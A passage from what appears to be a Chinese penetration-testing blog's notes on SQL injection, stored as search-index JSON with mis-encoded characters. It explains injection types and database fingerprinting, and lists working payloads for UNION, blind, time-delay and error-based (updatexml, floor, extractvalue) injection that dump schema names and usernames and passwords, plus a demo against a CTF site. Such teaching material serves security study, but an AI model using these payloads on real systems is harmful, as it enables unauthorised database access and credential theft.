æœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚å¯¹äº Web æ¸—é€è¿‡ç¨‹ä¸­ç”¨é€”å¾ˆå¤§ SCHEMATA è¡¨ï¼šæä¾›äº†å½“å‰ MySQL å®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯ã€‚æ˜¯ show databases çš„ç»“æœå–ä¹‹æ­¤è¡¨ã€‚ TABLES è¡¨ï¼šæä¾›äº†å…³äºæ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯(åŒ…æ‹¬è§†å›¾)ã€‚ COLUMNS è¡¨ï¼šæä¾›äº†è¡¨ä¸­çš„åˆ—ä¿¡æ¯ã€‚è¯¦ç»†è¡¨è¿°äº†æŸå¼ è¡¨çš„æ‰€æœ‰åˆ—ä»¥åŠæ¯ä¸ªåˆ—çš„ä¿¡æ¯ã€‚ é€šè¿‡å…ƒæ•°æ®è¡¨æŸ¥è¯¢æ•°æ®è¡¨ select table_name from information_schema.tables where table_schema='test'; é€šè¿‡å…ƒæ•°æ®è¡¨æŸ¥è¯¢æ•°æ®åˆ— select column_name from information_schema.columns where table_name='table1'; ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:1:4","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2 SQL æ³¨å…¥å®šä¹‰åŠç±»å‹ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:2:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.1 å®šä¹‰ å‘ç”Ÿäºåº”ç”¨ç¨‹åºä¸æ•°æ®åº“å±‚çš„å®‰å…¨æ¼æ´ ç½‘ç«™å†…éƒ¨ç›´æ¥å‘é€çš„ SQL è¯·æ±‚ä¸€èˆ¬ä¸ä¼šæœ‰å±é™©ï¼Œä½†å®é™…æƒ…å†µæ˜¯å¾ˆå¤šæ—¶å€™éœ€è¦ç»“åˆç”¨æˆ·çš„è¾“å…¥æ•°æ®åŠ¨æ€æ„é€  SQL è¯­å¥ï¼Œå¦‚æœç”¨è¾“å…¥çš„æ•°æ®è¢«æ„é€ æˆæ¶æ„ SQL ä»£ç ï¼ŒWeb åº”ç”¨åˆæœªå¯¹åŠ¨æ€æ„é€ çš„ SQL è¯­å¥ä½¿ç”¨çš„å‚æ•°è¿›è¡Œå®¡æŸ¥ï¼Œåˆ™ä¼šå¸¦æ¥å®‰å…¨é£é™©ã€‚ å½¢æˆåŸå›  ç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶ä¼ å‚ SQL è¯­å¥ä¸­æ‹¼æ¥äº†ç”¨æˆ·ä¼ å‚çš„å†…å®¹ æ‹¼æ¥åçš„ SQL è¯­å¥åœ¨æ•°æ®åº“ä¸­æ‰§è¡Œ æ€»ç»“ï¼šç”¨æˆ·è¾“å…¥çš„æ•°æ®ä½œä¸ºä»£ç æ‰§è¡Œ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:2:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"2.2 åˆ†ç±» å¸ƒå°”å‹æ³¨å…¥ è”åˆæŸ¥è¯¢æ³¨å…¥ æ—¶é—´å‹æ³¨å…¥ æŠ¥é”™å‹æ³¨å…¥ å †å æ³¨å…¥(å¤šè¯­å¥æŸ¥è¯¢æ³¨å…¥) ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:2:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3 åˆ¤æ–­ SQL æ³¨å…¥ é—®é¢˜ åˆ¤æ–­è¯¥è®¿é—®ç›®æ ‡ URL æ˜¯å¦å­˜åœ¨ SQL æ³¨å…¥ï¼Ÿ å¦‚æœå­˜åœ¨ SQL æ³¨å…¥ï¼Œé‚£ä¹ˆå±äºå“ªç§ SQL æ³¨å…¥ï¼Ÿ åˆ¤æ–­ SQL æ³¨å…¥åç«¯æ•°æ®åº“çš„ç±»å‹ï¼Ÿ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.1 ç»å…¸çš„å•å¼•å·åˆ¤æ–­æ³• http://xxx/text.php?id=1' å¦‚æœé¡µé¢è¿”å›é”™è¯¯ï¼Œåˆ™å­˜åœ¨ SQL æ³¨å…¥ï¼›åŸå› æ˜¯æ— è®ºå­—ç¬¦å‹è¿˜æ˜¯æ•´å‹éƒ½ä¼šå› ä¸ºå•å¼•å·ä¸ªæ•°ä¸åŒ¹é…è€ŒæŠ¥é”™ã€‚ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.2 åˆ¤æ–­æ³¨å…¥ç±»å‹ æ•°å­—å‹ é€šå¸¸æ„é€  and 1=1 ä»¥åŠ and 1=2 æ¥åˆ¤æ–­ è¿ç®—ç¬¦åˆ¤æ–­æ³•ï¼š è¿™ç§åˆ¤æ–­æ–¹æ³•çš„å…³é”®åœ¨äºé€šè¿‡åŠ ã€å‡ã€ä¹˜ã€é™¤ç­‰è¿ç®—ï¼Œåˆ¤æ–­è¾“å…¥å‚æ•°é™„è¿‘æœ‰æ²¡æœ‰å¼•å·åŒ…è£¹ï¼Œå†é€šè¿‡ä¸€äº›é€šç”¨çš„æ”»å‡»æ‰‹æ®µï¼Œè·å–æ•°æ®åº“çš„æ•æ„Ÿä¿¡æ¯ã€‚ å­—ç¬¦å‹ é€šå¸¸æ„é€  and '1'='1 ä»¥åŠ and '1'='2 æ¥åˆ¤æ–­ ç±»å‹è½¬æ¢åˆ¤æ–­æ³•ï¼š åœ¨ MySQL ä¸­ï¼Œç­‰å·ä¸¤è¾¹å¦‚æœç±»å‹ä¸ä¸€è‡´ï¼Œåˆ™ä¼šå‘ç”Ÿå¼ºåˆ¶è½¬æ¢ã€‚å½“æ•°å­—ä¸å­—ç¬¦ä¸²æ•°æ®æ¯”è¾ƒæ—¶ï¼Œå­—ç¬¦ä¸²å°†è¢«è½¬æ¢ä¸ºæ•°å­—ï¼Œå†è¿›è¡Œæ¯”è¾ƒã€‚å­—ç¬¦ä¸² 1 ä¸æ•°å­—ç›¸ç­‰ï¼›å­—ç¬¦ä¸² 1a è¢«å¼ºåˆ¶è½¬æ¢æˆ 1ï¼Œä¸ 1 ç›¸ç­‰ï¼›å­—ç¬¦ä¸² a è¢«å¼ºåˆ¶è½¬æ¢æˆ 0 æ‰€ä»¥ä¸ 0 ç›¸ç­‰ã€‚ æŒ‰ç…§è¿™ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å®¹æ˜“åˆ¤æ–­è¾“å…¥ç‚¹æ˜¯å¦ä¸ºå­—ç¬¦å‹ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦æœ‰å¼•å·ï¼ˆå¯èƒ½æ˜¯å•å¼•å·ä¹Ÿå¯èƒ½æ˜¯åŒå¼•å·ï¼Œç»å¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯å•å¼•å·ï¼‰åŒ…è£¹ã€‚è®¿é—® ?id=3-2ï¼Œé¡µé¢ä¸ºç©ºï¼Œä¸æ˜¯æ•°å­—å‹ï¼Œå¯èƒ½æ˜¯å­—ç¬¦å‹ã€‚ç»§ç»­å°è¯•è®¿é—® ?id=2aï¼ŒæˆåŠŸè¿”å›ç»“æœï¼Œè¯´æ˜æ˜¯å­—ç¬¦å‹ã€‚ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"3.3 SQL æ•°æ®åº“çš„ç±»å‹ 3.3.1 é€šè¿‡æŠ¥é”™ä¿¡æ¯ MySQL you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near â€ at line x Access Microsoft JET Databaseâ€¦ MSSQL Microsoft ODBC Databaseâ€¦ 3.3.2 æ•°æ®åº“æ ‡å¿—æ€§ä¿¡æ¯ sql serverï¼šselect @@version-- Oracleï¼šselect banner from v$version mysqlï¼šselect @@versionï¼Œversion()-- ï¼Œlength(user)\u003e0æ­£å¸¸ postgresqlï¼šselect version()-- 3.3.3 æ•°æ®åº“ç‰¹æœ‰åº“å MySQLï¼šinformation_schema Accessï¼šmysysobjects Oracleï¼šsys.user_tables MSSQLï¼šsysobjects 3.3.4 æ•°æ®åº“ç‰¹æœ‰å‡½æ•° sql serverï¼š@@pack_received @@rowcount mysqlï¼šconnection_id()ã€last_insert_id()ã€row_count() orcaleï¼šbitand(1,1) postgresqlï¼š select extract(dow from now()) åœ¨ mssql ä¸­å¯ä»¥è°ƒç”¨ substringã€‚oracle åˆ™åªå¯è°ƒç”¨ substr 3.3.5 å­—ç¬¦ä¸²å¤„ç†æ–¹å¼ mssqlï¼šid=1 and 'a'+'b'='ab' mysqlï¼šid=1 and 'a'+'b'='ab' ï¼Œ 'ab'=concat('a','b') oracleï¼šid=1 and 'a'+'b'='a'||'b' ï¼Œ'ab'=concat('a','b') postgresqlï¼šid=1 and 'a'+'b'='a'||'b' ,'ab'=concat('a','b') 3.3.6 ç‰¹æ®Šç¬¦å·åŠæ³¨é‡Š null å’Œ %00 æ˜¯ access æ”¯æŒçš„æ³¨é‡Š # æ˜¯ MySQL ä¸­çš„æ³¨é‡Šç¬¦ï¼Œè¿”å›é”™è¯¯è¯´æ˜è¯¥æ³¨å…¥ç‚¹å¯èƒ½ä¸æ˜¯ MySQLï¼Œå¦å¤–ä¹Ÿæ”¯æŒ-- ï¼Œå’Œ /* */ æ³¨é‡Š -- å’Œ /* */ æ˜¯ Oracleï¼ŒSQL server å’Œ MySQL æ”¯æŒçš„æ³¨é‡Šç¬¦ï¼Œå¦‚æœæ­£å¸¸ï¼Œè¯´æ˜å¯èƒ½å°±æ˜¯è¿™ä¸‰ä¸ªæ•°æ®åº“å…¶ä¸­ä¹‹ä¸€ã€‚ ; æ˜¯å­å¥æŸ¥è¯¢æ ‡è¯†ç¬¦ï¼Œåœ¨ Oracle ä¸­ä¸æ”¯æŒå¤šè¡ŒæŸ¥è¯¢ï¼Œè¿”å›é”™è¯¯ï¼Œå¾ˆå¯èƒ½æ˜¯ Oracle æ•°æ®åº“ã€‚ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:3:3","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4 UNION è”åˆæŸ¥è¯¢æ³¨å…¥ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:4:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4.1 åŸç† union æ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæŸ¥è¯¢æˆ–è€…å¤šä¸ª select è¯­å¥çš„ç»“æœé›† ä¿¡æ¯ UNION å†…éƒ¨çš„ select è¯­å¥å¿…é¡»æœ‰ç›¸åŒæ•°é‡çš„åˆ—ã€‚ é€šè¿‡ UNION è”åˆæŸ¥è¯¢ï¼Œç›´æ¥å°†æŸ¥è¯¢çš„ç»“æœè¿”å›ç»™é¡µé¢ï¼Œæ˜¯æœ€ç®€å•çš„ä¸€ç§æ³¨å…¥æ–¹å¼ã€‚ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:4:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"4.2 å¸¸ç”¨è¯­å¥ // åº“å union select 1,group_concat(schema_name),3 from information_schema.schemata union select 1,(select schema_name from information_schema.schemata limit 0,1),3 // è¡¨å union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' // åˆ—å union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='emails' // æ•°æ® union select 1,group_concat(id,email_id),3 from security.emails ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:4:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"5 æ—¶é—´å‹ç›²æ³¨ \u0026 å¸ƒå°”å‹ç›²æ³¨ ç›²æ³¨æ˜¯æ³¨å…¥çš„ä¸€ç§ï¼ŒæŒ‡çš„æ˜¯åœ¨ä¸çŸ¥é“æ•°æ®åº“è¿”å›å€¼çš„æƒ…å†µä¸‹å¯¹æ•°æ®ä¸­çš„å†…å®¹è¿›è¡ŒçŒœæµ‹ï¼Œå®æ–½ SQL æ³¨å…¥ã€‚ç›²æ³¨ä¸€èˆ¬åˆ†ä¸ºå¸ƒå°”ç›²æ³¨å’ŒåŸºäºæ—¶é—´çš„ç›²æ³¨å’ŒæŠ¥é”™çš„ç›²æ³¨ã€‚ æ—¶é—´å‹ï¼šé€šè¿‡æ³¨å…¥ç‰¹å®šè¯­å¥ï¼Œæ ¹æ®é¡µé¢è¯·æ±‚çš„ç‰©ç†åé¦ˆï¼Œæ¥åˆ¤æ–­æ˜¯å¦æ³¨å…¥æˆåŠŸï¼Œå¦‚ï¼šåœ¨ SQL è¯­å¥ä¸­ä½¿ç”¨ sleep() å‡½æ•°çœ‹åŠ è½½ç½‘é¡µçš„æ—¶é—´æ¥åˆ¤æ–­æ³¨å…¥ç‚¹ã€‚ å¸ƒå°”å‹ï¼šé¡µé¢åªè¿”å› True å’Œ False ä¸¤ç§çŠ¶æ€(ç±»å‹)é¡µé¢ã€‚åˆ©ç”¨é¡µé¢è¿”å›ä¸åŒï¼Œé€ä¸ªçŒœè§£æ•°æ®ã€‚ é€‚ç”¨åœºæ™¯ï¼šé€šå¸¸æ— æ³•ä»æ˜¾ç¤ºé¡µé¢ä¸Šè·å–æ‰§è¡Œç»“æœï¼Œç”šè‡³è¿æ³¨å…¥è¯­å¥æ˜¯å¦æ‰§è¡Œéƒ½æ— ä»å¾—çŸ¥ã€‚ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:5:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"5.1 åŸç†ç¤ºæ„ select * from user where id = '?' ? ä¸ºç”¨æˆ·è¾“å…¥ï¼Œæ›¿ä»£ä¸ºï¼š4' and sleep(3)# å®é™…æ‰§è¡Œçš„ SQL è¯­å¥ï¼šselect * from user where id = '4' and sleep(3)# å½“ ID = 4 å­˜åœ¨æ—¶ï¼Œsleep 3 ç§’ å½“ ID = 4 ä¸å­˜åœ¨æ—¶ï¼Œç›´æ¥è¿”å› æ•´æ¡æ‹¼æ¥å‡ºæ¥çš„ SQL æ˜¯æ­£ç¡®çš„å°±æ‰§è¡Œ sleepï¼Œå‰é¢é”™è¯¯ï¼ˆä¸å­˜åœ¨ï¼‰ï¼Œsleep(3) ä¸æ‰§è¡Œ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:5:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"5.2 å¸¸ç”¨å‡½æ•° 5.2.1 ç¼–ç è½¬æ¢å‡½æ•° ord('a')ï¼šå°†å­—ç¬¦è½¬åŒ–ä¸º ascii ç  ascii('a')ï¼šå°†å­—ç¬¦è½¬åŒ–ä¸º ascii ç  char(97)ï¼šå°† ascii è½¬åŒ–ä¸ºå­—ç¬¦ 5.2.2 æ¡ä»¶åˆ¤æ–­å‡½æ•° if(exp1, exp2, exp3)ï¼šexp1 æˆç«‹ï¼Œæ‰§è¡Œ exp2ï¼Œå¦åˆ™æ‰§è¡Œ exp3ã€‚ case when then å‡½æ•°ï¼šselect case when username=\"admin\" then sleep(1) else \"error\" end from wp_user_ 5.2.3 æˆªå–å‡½æ•° substr å‡½æ•° substr(str, pos, len)ï¼šä» pos ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² str çš„ len é•¿åº¦ substr(str from pos for length) ï¼šå¯ä»¥ç”¨åœ¨è¿‡æ»¤äº† , çš„æƒ…å†µ substring å‡½æ•° substring(str, pos, len)ï¼šä» pos ä½ç½®å¼€å§‹ï¼Œæˆªå–å­—ç¬¦ä¸² str çš„ len é•¿åº¦ substring(str from pos for length) ï¼šå¯ä»¥ç”¨åœ¨è¿‡æ»¤äº† , çš„æƒ…å†µ æ³¨æ„ï¼špos ä» 1 å¼€å§‹ id=1 and if(ord(substr(database(),1,1))=116,1,0)%23 select substring(database(), from 1 for 1) select substring(database(), 0, 1) mid å‡½æ•° mid(str, pos, length) mid(str from pos for length) select mid(database(), from 1 for 1) select mid(database(), 1, 1) left å‡½æ•° ä»å·¦å¼€å§‹æˆªå–å­—ç¬¦ä¸² left(str, len) select left(database(), 1) right å‡½æ•° ä»å³å¼€å§‹æˆªå–å­—ç¬¦ä¸² right(str, len) åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼é€ä½åŒ¹é… select * from wp_user_ where password rlike \"^1\" select * from wp_user_ where password REGEXP \"^1\" select * from wp_user_ where password REGEXP \"^12\" ... 5.2.4 å»¶æ—¶å‡½æ•° sleep(n)ï¼šç¨‹åºæŒ‚èµ· n ç§’ if(ascii(substr(database() from 0))=97, sleep(3),0) benchmark(count, sha(1))ï¼šæ‰§è¡Œ sha(1) å‡½æ•° count æ¬¡è¾¾åˆ°å»¶æ—¶çš„ç›®çš„ SELECT BENCHMARK(10000000, sha(1)) åˆ©ç”¨ç¬›å¡å°”ç§¯åˆ¶é€ å»¶æ—¶ï¼š SELECT count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C; åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…é•¿å­—ç¬¦ä¸²åˆ¶é€ å»¶æ—¶ï¼š select * from wp_user_ where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) 5.2.5 å…¶å®ƒå‡½æ•° count()ï¼šè®¡ç®—æ€»æ•° length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:5:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"6 æŠ¥é”™å‹æ³¨å…¥ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:6:0","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"6.1 åŸç† ç”¨äºä½¿ç”¨ SQL è¯­å¥æŠ¥é”™çš„è¯­æ³•ï¼Œç”¨äºæ³¨å…¥ç»“æœæ— å›æ˜¾ï¼Œä½†æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯æœ‰è¾“å‡ºçš„æƒ…å†µ è¿”å›çš„ä¿¡æ¯å³æ˜¯æ”»å‡»è€…éœ€è¦çš„ä¿¡æ¯ MySQL æŠ¥é”™æ³¨å…¥ä¸»è¦åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š BigInt ç­‰æ•°æ®ç±»å‹æº¢å‡º Xpath è¯­æ³•é”™è¯¯ count() + rand() + group by å¯¼è‡´ä¸»é”®é‡å¤ ç©ºé—´æ•°æ®ç±»å‹å‡½æ•°é”™è¯¯ ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:6:1","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"6.2 å¸¸ç”¨å‡½æ•° 6.2.1 updatexml updatexml ç¬¬äºŒä¸ªå‚æ•°éœ€è¦ä¼ å…¥çš„æ˜¯ Xpath æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚è¾“å…¥ä¸ç¬¦åˆï¼Œå°†å‚æ•°å€¼è¿”å›å¹¶æŠ¥é”™ã€‚ æŠ¥é”™é•¿åº¦æœ€å¤§ä¸º 32 ä½ // æ˜¾ç¤ºå½“å‰æ•°æ®åº“ updatexml(1,CONCAT(0x7e, database()),1) // æ˜¾ç¤ºæ‰€æœ‰æ•°æ®åº“ updatexml(1,CONCAT(0x7e,(select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit x,1), 0x7e),1) // è·å–è¡¨å updatexml(1,CONCAT(0x7e,(select table_name from information_schema.tables where table_schema=\"sectest\" limit x,1), 0x7e),1) updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) // è·å–åˆ—å updatexml(1,CONCAT(0x7e,(select column_name from information_schema.COLUMNS where table_name=\"wp_user_\" limit 1,1), 0x7e),1) updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=\"users\")),1) // è·å–æ•°æ® updatexml(1,CONCAT(0x7e,(select username from wp_user_ limit 0,1), 0x7e),1) updatexml(1,CONCAT(0x7e,(select password from wp_user_ where username=\"admin\" limit 0,1), 0x7e),1) updatexml(1,CONCAT(0x7e,(select GROUP_CONCAT(username, 0x3a, password) from wp_user_ where id=1), 0x7e),1) updatexml(1,make_set(3,'~',(select data from users)),1)# 6.2.2 floor æ˜¾é”™æ³¨å…¥ and (select 1 from (select count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a) and (select 1 from (select count(*), concat((select group_concat(username,0x3a,password) from wp_user_ where id=1), floor(rand(0)*2))x from information_schema.tables group by x)a) 6.2.3 å…¶å®ƒæ˜¾é”™æ³¨å…¥ and extractvalue(1,concat(0x7e,(select database()))) //1105 - XPATH syntax error: '~sectest', Time: 0.000000s and exp(~(select * from (select user())a)) // mysql5 union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a; //1060 - Duplicate column name '5.7.23', Time: 0.000000s 6.3 Demo http://ctf5.shiyanbar.com/web/baocuo/index.php payload updatexml(1,concat(0x7e,(version())),0) http://ctf5.shiyanbar.com/web/baocuo/index.php $sql=\" select * from users where username='' and updatexml /*' and password='*/(1,concat(0x7e,(version())),0) or '1' \" ","date":"2021-01-02","objectID":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/:6:2","tags":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"title":"SQLæ³¨å…¥ç›¸å…³","uri":"/2021/01/sql%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"},{"categories":["å¸¸ç”¨","æ¸—é€æµ‹è¯•"],"content":"7 å †å æ³¨å…¥ ä¸€å † SQL è¯­å¥(å¤šæ¡)ä¸€èµ·æ‰§è¡Œ åœ¨ MySQL ä¸­ï¼Œä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­ï¼Œæ¯æ¡è¯­å¥ç»“å°¾åŠ  ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·å¯ä»¥è€ƒè™‘å¤šæ¡ SQL è¯­å¥ä¸€èµ·ä½¿ç”¨ é—®é¢˜ å †å æ³¨å…¥å’Œ UNION 